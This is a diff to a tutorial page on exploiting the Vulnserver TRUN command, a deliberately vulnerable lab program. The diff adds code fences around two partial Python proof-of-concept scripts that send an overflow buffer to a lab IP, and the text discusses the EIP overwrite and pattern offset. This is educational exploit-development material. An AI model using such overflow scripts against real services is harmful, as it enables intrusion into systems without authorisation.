@@ -12,7 +12,8 @@ classes: wide
 Begin by using the below proof of concept script, developed by using the SPIKE fuzzer to identify a hole in the Vulnserver TRUN command.
 
 	Vulnserver TRUN Python Script: POC
-		#!/usr/bin/python
+		```py
+    #!/usr/bin/python
 		import socket
 		import os
 		import sys
@@ -27,7 +28,7 @@ Begin by using the below proof of concept script, developed by using the SPIKE f
 		expl.connect(("192.168.83.128", 9999))
 		expl.send(buffer)
     expl.close()
-
+    ```
 Running this POC script against Vulnserver produces the same result in the OllyDbg debugger as our previous SPIKE fuzzing attempts. As a very nice bonus, the input we sent has been used to control the value of a very important register in the CPU – the EIP (Extended Instruction Pointer) register. Notice how the EIP register contains the value 41414141?
 
 ![trun-eip-overwrite-media-01](/screenshots/vulnserver/trun-eip-overwrite/trun-eip-overwrite-media-01.png)
@@ -38,6 +39,7 @@ Additional testing proves that a 2500 byte buffer will also cause the Vulnserver
 Insert the 2500 character pattern into the Vulnserver TRUN POC Python Script.
 
   Vulnserver TRUN Python Script: Pattern
+    ```py
     #!/usr/bin/python
     import socket
     import os
@@ -53,7 +55,7 @@ Insert the 2500 character pattern into the Vulnserver TRUN POC Python Script.
     expl.connect(("192.168.83.128", 9999))
     expl.send(buffer)
     expl.close()
-
+    ```
 Running the Vulnserver TRUN Pattern Python Script against the target system shows that the following pattern value is being stored in EIP.
 
 ![trun-eip-overwrite-media-02](/screenshots/vulnserver/trun-eip-overwrite/trun-eip-overwrite-media-02.png)
